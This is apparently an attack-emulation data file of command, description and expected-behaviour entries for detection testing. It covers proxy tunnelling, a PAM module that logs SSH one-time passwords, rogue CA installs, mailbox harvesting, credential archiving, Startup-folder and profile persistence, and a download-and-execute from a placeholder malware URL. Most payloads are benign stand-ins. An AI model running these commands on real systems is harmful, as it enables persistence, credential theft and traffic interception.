attacks.command: netsh winhttp set proxy proxy-server="127.0.0.1:8080" bypass-list="*.local"
attacks.description: Sets system-wide WinHTTP proxy to a local SOCKS-like proxy on port 8080, bypassing local addresses.
attacks.expected_behavior: Configures the WinHTTP proxy settings for the system. Requires elevated privileges. No network connection is made until a WinHTTP-using process runs.

attacks.description: Uses certutil to fetch a file via HTTP, which will route through any configured proxy (e.g., set via netsh). Simulates proxy-based exfiltration or download.
attacks.expected_behavior: Attempts to download a non-existent file over HTTP using the system's proxy settings. Fails silently if no proxy or file exists. Leaves no persistent changes.

attacks.command: powershell -Command "try { $wc = New-Object Net.WebClient; $wc.Proxy = New-Object Net.WebProxy('http://127.0.0.1:8080'); $wc.DownloadString('http://test.local/test') } catch { } finally { if ($wc) { Remove-Variable wc } }"
attacks.description: Creates a PowerShell WebClient that routes traffic through a local proxy on port 8080, simulating beaconing over a tunnel.
attacks.expected_behavior: Attempts to make an HTTP request via a specified proxy. No data is exfiltrated. The proxy is not validated, so failure is expected in clean environments.

attacks.description: Establish a background SOCKS5 proxy tunnel using SSH dynamic port forwarding on port 1080
attacks.expected_behavior: Creates a SOCKS5 proxy on localhost:1080, forwarding traffic through the SSH connection to 192.168.1.100. Runs in background (-f) and does not execute remote commands (-N). No data is transferred unless client applications are configured to use the proxy.

attacks.description: Use socat to forward incoming connections on port 8080 through an existing SOCKS proxy (port 1080) to an internal target
attacks.expected_behavior: Listens on port 8080 and forwards traffic via the SOCKS4A proxy running on 127.0.0.1:1080 to target.internal:80. Runs in background. Simulates pivoting through a compromised host with an active proxy.

attacks.description: Establish a reverse SOCKS-style tunnel by forwarding the local SSH service through the attacker's machine on port 9010
attacks.expected_behavior: Forwards the local SSH service (port 22) to port 9010 on the attacker's machine (192.168.1.100). Allows the attacker to access this host via SSH through the reverse tunnel. Runs in background with output logged to /tmp/ssh_proxy.log.

attacks.description: Download a benign file to the temp directory using certutil

attacks.expected_behavior: A new directory will be created and a benign string will be written to a file

attacks.description: Intermediate transparent proxy using socat that forwards SSH traffic while logging all data, enabling capture of OTP exchanges.
attacks.expected_behavior: The proxy listens on localhost port 2222, forwards connections to the real SSH server, and writes the raw traffic (including OTP prompts and responses) to otp_capture.log.

attacks.command: sudo cp /tmp/pam_otp_logger.so /lib/security/ && sudo bash -c 'echo "auth required pam_otp_logger.so" >> /etc/pam.d/sshd'
attacks.description: Advanced persistent method that installs a malicious PAM module to log OTPs during SSH authentication and updates the PAM configuration for sshd.
attacks.expected_behavior: The PAM module is copied to the system library directory and the sshd PAM config is appended to invoke the module, causing OTPs entered for SSH logins to be recorded (e.g., in /var/log/auth.log).

attacks.command: sudo apt-get update && sudo apt-get install openvpn -y
attacks.description: Install OpenVPN to setup a virtual private server for secure remote access.
attacks.expected_behavior: Installs OpenVPN package and its dependencies, enabling the setup of a VPN server.

attacks.description: Run a Docker container named my-vps from the Ubuntu image, mapping port 8080 on the host to port 80 in the container, simulating a virtual private server.
attacks.expected_behavior: Starts a new Docker container from the Ubuntu image, making it accessible via port 8080 on the host machine.

attacks.description: Generate an RSA SSH key pair and copy the public key to a remote virtual private server for secure login.
attacks.expected_behavior: Generates a secure SSH key pair and installs the public key on the remote server, enabling password-less SSH login.

attacks.description: Basic: Download a file from a remote server using PowerShell on Linux
attacks.expected_behavior: Attempts to download test.txt from example.com to the user's cache directory. Fails silently if network is unavailable or path doesn't exist.

attacks.description: Intermediate: Execute a Base64-encoded PowerShell command on Linux
attacks.expected_behavior: Decodes and executes a benign Base64 string (comment only). Simulates execution of encoded commands commonly used in obfuscation.

attacks.command: pwsh -Command "$cron = '@reboot root /usr/bin/pwsh -Command \"Start-Process /bin/sh -ArgumentList '-c', 'echo \'Hello from persistence\''\"'; $path = '/tmp/test-cron'; Set-Content -Path $path -Value $cron -ErrorAction SilentlyContinue; Write-Output 'Persistence written to $path (simulated)'"
attacks.description: Advanced: Simulate writing a cron-based persistence mechanism using PowerShell on Linux
attacks.expected_behavior: Creates a simulated cron entry file in /tmp. No actual system modification occurs unless manually deployed. Demonstrates attempt to establish persistence via scheduled execution.

attacks.description: Stores fake cloud credentials using built-in cmdkey utility for persistence simulation.
attacks.expected_behavior: Adds a stored Windows credential for 'cloud.aws.internal' with username 'fakeuser' and a dummy password. Visible via 'cmdkey /list'.

attacks.description: Creates a startup script that adds cloud-like credentials and registers it via scheduled task to simulate persistence.
attacks.expected_behavior: Writes a batch file to %TEMP% that stores fake cloud credentials and creates a scheduled task to run it at user logon with highest privileges. Task persists across reboots.

attacks.description: Simulates persistence by storing fake cloud credentials in an encrypted XML file using PowerShell, mimicking legitimate cloud tool behavior.
attacks.expected_behavior: Creates a directory in %APPDATA% and stores a dummy secure string (fake API key) in an encrypted XML file, simulating how tools like AWS PowerShell modules store credentials.

attacks.description: Basic: Copy AWS credentials to a hidden backup file in the home directory
attacks.expected_behavior: Creates a backup of AWS credentials in the home directory with a .bak extension. Fails silently if AWS credentials don't exist.

attacks.description: Intermediate: Archive cloud and SSH credentials into a compressed, hidden tarball
attacks.expected_behavior: Creates a compressed archive containing AWS credentials and SSH private key in a hidden config directory. Silently continues if files are missing.

attacks.description: Advanced: Encode AWS credentials in base64 and append to a hidden tagged file for stealthy persistence
attacks.expected_behavior: Generates a timestamped tag, base64-encodes AWS credentials, and appends them to a hidden file in .local/share. Used to simulate obfuscated credential storage.

attacks.description: Decode a hexadecimal string using certutil, simulating data reception in a command and control scenario.
attacks.expected_behavior: The command decodes a hexadecimal string from a file named test.txt in the temp directory and saves the result to another file named test.dat in the same directory.

attacks.description: Encode a string to Base64 using PowerShell, simulating data preparation for asymmetric cryptographic operations.
attacks.expected_behavior: The command encodes the string 'Hello, World!' to Base64 and prints the encoded string to the console.

attacks.description: Verify a certificate file using certutil, demonstrating the use of asymmetric cryptography for authentication.
attacks.expected_behavior: The command verifies a certificate file named test.cer in the temp directory and displays the verification result.

attacks.description: Generate a 2048-bit RSA private key for asymmetric encryption
attacks.expected_behavior: Creates a private key file in the user's .ssh directory. No network activity occurs. Command is safe and reversible.

attacks.description: Encrypt a benign test command using the public key derived from the private key
attacks.expected_behavior: Outputs encrypted data to a temporary file. Uses rsautl for RSA encryption. No execution of the command occurs.

attacks.description: Simulate C2 server behavior by decrypting and safely logging a command (not executing it directly)
attacks.expected_behavior: Decrypts the previously stored data and simulates command handling by echoing it. The command is not actually executed due to safe wrapper.

attacks.command:
cat <<'EOF' > /tmp/test-ca.crt
-----BEGIN CERTIFICATE-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr...
-----END CERTIFICATE-----
EOF && sudo cp /tmp/test-ca.crt /usr/local/share/ca-certificates/ && sudo update-ca-certificates
attacks.description: Basic installation: writes a dummy certificate to /tmp, copies it into the system CA directory, and updates the trust store.
attacks.expected_behavior: A new certificate appears in the system's trusted CA bundle; update-ca-certificates reports the addition without error.

attacks.command: openssl req -new -x509 -days 365 -nodes -subj "/CN=Test Cert" -keyout /tmp/test.key -out /tmp/test.crt && sudo cp /tmp/test.crt /usr/local/share/ca-certificates/ && sudo update-ca-certificates
attacks.description: Intermediate method: generates a self‑signed certificate with OpenSSL, then installs it into the system CA store.
attacks.expected_behavior: OpenSSL creates a new certificate and key in /tmp; the certificate is copied to the CA directory and the trust store is refreshed, adding the new cert.

attacks.command: openssl req -new -x509 -days 365 -nodes -subj "/CN=Advanced Cert" -keyout /tmp/adv.key -out /tmp/adv.crt && sudo certutil -A -d sql:/etc/pki/nssdb -n "Advanced Cert" -t "C,," -i /tmp/adv.crt
attacks.description: Advanced method: creates a self‑signed certificate and adds it to the NSS database used by browsers via certutil.
attacks.expected_behavior: OpenSSL generates a certificate; certutil adds the certificate to the NSS DB, making it trusted for SSL/TLS connections in applications that use NSS.

attacks.description: Basic remote email collection using curl's IMAP support to download all messages from the INBOX.
attacks.expected_behavior: curl connects to the IMAP server, authenticates with the supplied credentials, retrieves all messages, and writes them to $HOME/email_basic.eml.

attacks.command: echo "poll mail.example.com protocol IMAP username \"user\" password \"password\" mda \"cat > $HOME/email_fetchmail.eml\"" > $HOME/.fetchmailrc && chmod 600 $HOME/.fetchmailrc && fetchmail -f $HOME/.fetchmailrc -v
attacks.description: Intermediate collection using fetchmail with a temporary configuration that pipes each retrieved email into a local file.
attacks.expected_behavior: fetchmail reads the temporary .fetchmailrc, connects to the remote IMAP server, downloads messages, and writes them to $HOME/email_fetchmail.eml while outputting verbose logs.

attacks.command:
openssl s_client -crlf -connect mail.example.com:993 <<EOF > $HOME/email_advanced.eml
a login user password
b select INBOX
c fetch 1 body[text]
d logout
EOF
attacks.description: Advanced collection by manually performing an IMAP session over TLS with openssl s_client and extracting the body of the first message.
attacks.expected_behavior: openssl establishes a TLS connection to the IMAP server, sends IMAP commands to authenticate, select the INBOX, fetch the first message's body, and logs out; the output is saved to $HOME/email_advanced.eml.

attacks.command: echo @echo off & echo Starting RC script & calc.exe > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rc_script.bat"
attacks.description: Creates a batch script in the user's Startup folder to execute on login, simulating RC script persistence.
attacks.expected_behavior: A batch file named 'rc_script.bat' is created in the current user's Startup folder. When the user logs in, the script runs and launches calc.exe.

attacks.command: powershell -Command "mkdir '$env:APPDATA\\rc_scripts' -ErrorAction SilentlyContinue; Set-Content -Path '$env:APPDATA\\rc_scripts\\profile.ps1' -Value 'Start-Process calc.exe' -Force; $shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut('$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rc_loader.lnk'); $shortcut.TargetPath = 'powershell.exe'; $shortcut.Arguments = '-ExecutionPolicy Bypass -File "$env:APPDATA\\rc_scripts\\profile.ps1"'; $shortcut.Save()"
attacks.description: Creates a PowerShell RC script in a dedicated folder and sets up a startup shortcut to execute it upon login.
attacks.expected_behavior: A directory 'rc_scripts' is created in APPDATA, containing 'profile.ps1' that launches calc.exe. A shortcut in the Startup folder runs this script when the user logs in.

attacks.command: certutil.exe -f -encode "C:\\Windows\\System32\\calc.exe" "%TEMP%\\rc_data.b64" >nul 2>&1 && echo echo Running RC init... > "%TEMP%\\rc_init.bat" && echo certutil -decode "%TEMP%\\rc_data.b64" "%TEMP%\\rc_calc.exe" >> "%TEMP%\\rc_init.bat" && echo start "" "%TEMP%\\rc_calc.exe" >> "%TEMP%\\rc_init.bat" && copy "%TEMP%\\rc_init.bat" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rc_init.bat" >nul
attacks.description: Encodes calc.exe using certutil, creates a batch script that decodes and runs it, and places the script in Startup for persistence.
attacks.expected_behavior: The command uses certutil to encode calc.exe, creates a batch script that decodes and executes it, and copies the batch script to the user's Startup folder to run on login.

attacks.description: Basic persistence via ~/.bashrc: appends a command that logs a test message on shell login.
attacks.expected_behavior: On next shell login, the message '[test] user session started' is appended to /tmp/rc_test.log. The change persists across sessions until manually removed from ~/.bashrc.

attacks.command: echo 'if [ -z \"$RC_PERSISTENCE_SET\" ]; then export RC_PERSISTENCE_SET=1; echo \"[persistence] env initialized\" >> /tmp/rc_persistence.log; fi' >> ~/.profile
attacks.description: Intermediate persistence using ~/.profile with a guard condition to avoid repeated execution in nested shells.
attacks.expected_behavior: On login, the message '[persistence] env initialized' is written once per session to /tmp/rc_persistence.log. The environment variable prevents re-execution in subshells.

attacks.description: Advanced persistence with base64-encoded command in ~/.bashrc to obfuscate intent.
attacks.expected_behavior: On each shell login, the base64 string is decoded and executed, appending a timestamped message like 'persistence timestamp: <current time>' to /tmp/rc_log.log. Obfuscation mimics stealthy adversary behavior.

attacks.command: powershell -Command "try { $domain = Get-ADDomain; $dc = Get-ADDomainController -Discover -Service 'Primary'; Write-Output "[INFO] Found domain controller: $($dc.HostName)" } catch { Write-Error 'AD module not available' }"
attacks.description: Basic DCSync simulation: Discovers domain controller using built-in Active Directory PowerShell module (if available).
attacks.expected_behavior: Attempts to discover a domain controller via AD module. Outputs DC hostname if successful, or error if module not loaded. No credentials are extracted.

attacks.description: Intermediate DCSync simulation: Uses nltest.exe (built-in) to query domain controller information, mimicking early reconnaissance phase of DCSync.
attacks.expected_behavior: Queries domain controller via nltest. Outputs DC location and trust information. This is a legitimate Windows command often seen in pre-DCSync reconnaissance.

attacks.description: Advanced simulation: Executes nltest command via encoded PowerShell to mimic obfuscated DCSync reconnaissance.
attacks.expected_behavior: Spawns a hidden PowerShell process that runs nltest to query domain controller. The command is Base64-encoded (UTF-16LE) but benign. No actual credential dumping occurs.

attacks.description: Lists all running services, which can be used to identify system processes.
attacks.expected_behavior: Displays a list of all running services on the system.

attacks.command: sc create MyService binPath= "C:\\Windows\\System32\\svchost.exe -k netsvcs" type= own start= auto
attacks.description: Creates a new service named MyService that runs svchost.exe, demonstrating the creation of a system process.
attacks.expected_behavior: Creates a new service named MyService that will automatically start and run svchost.exe.

attacks.description: Uses PowerShell to start a new process of notepad.exe, demonstrating the creation of a system process using PowerShell.
attacks.expected_behavior: Opens a new instance of Notepad.

attacks.description: Creates a user-level cron job that runs every minute, writing a test string to a file in /tmp
attacks.expected_behavior: A cron job is installed for the current user and executes the command every minute, creating or overwriting /tmp/cron_test.txt with the word 'test'

attacks.command:
sudo sh -c 'echo "[Unit]
Description=Test Persistence
[Service]
ExecStart=/bin/sh -c "while true; do echo test > /tmp/service_test.txt; sleep 60; done"
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/test-persistence.service && systemctl daemon-reload && systemctl enable test-persistence.service && systemctl start test-persistence.service'
attacks.description: Creates a system-wide systemd service that runs a persistent loop writing to a file every minute
attacks.expected_behavior: A systemd service is created, enabled, and started. It runs a loop that writes 'test' to /tmp/service_test.txt every 60 seconds. Requires root privileges to install the service file and manage the daemon.

attacks.description: Download and execute a file using certutil and start command
attacks.expected_behavior: Downloads a file from a local server to %TEMP% using certutil, then executes it via 'start'. Simulates user launching a downloaded update.

attacks.description: Use PowerShell to simulate user opening a malicious Office document
attacks.expected_behavior: Attempts to open a document file using the default application. Safe if file does not exist; simulates user double-clicking a malicious file.

attacks.description: Write EICAR test string to file and execute it
attacks.expected_behavior: Creates the EICAR test file in %TEMP% and executes it. Antivirus may flag it, but it is safe and non-malicious by design.

attacks.description: Basic user execution: create and run a local shell script from a hidden cache directory
attacks.expected_behavior: Creates a benign script in the user's hidden .cache directory, makes it executable, and runs it. Output: 'Simulated malicious payload'. No persistence or network activity.

attacks.command: wget -qO $TMP/installer.sh http://example.com/fake/malware.sh 2>/dev/null || echo 'echo "Offline test mode"' > $TMP/installer.sh && chmod +x $TMP/installer.sh && $TMP/installer.sh
attacks.description: Intermediate: download and execute a script, with fallback to local test content if offline
attacks.expected_behavior: Attempts to download a script (non-existent domain for safety), falls back to creating a benign local version. Makes it executable and runs it. Output: 'Offline test mode'. Simulates common download-and-execute behavior without real payload.

attacks.description: Advanced: inline execution of base64-decoded command to simulate obfuscated script launch
attacks.expected_behavior: Decodes and executes a base64-encoded benign string. Output: 'Simulated obfuscated payload'. Mimics obfuscated one-liner execution seen in real attacks without malicious intent.
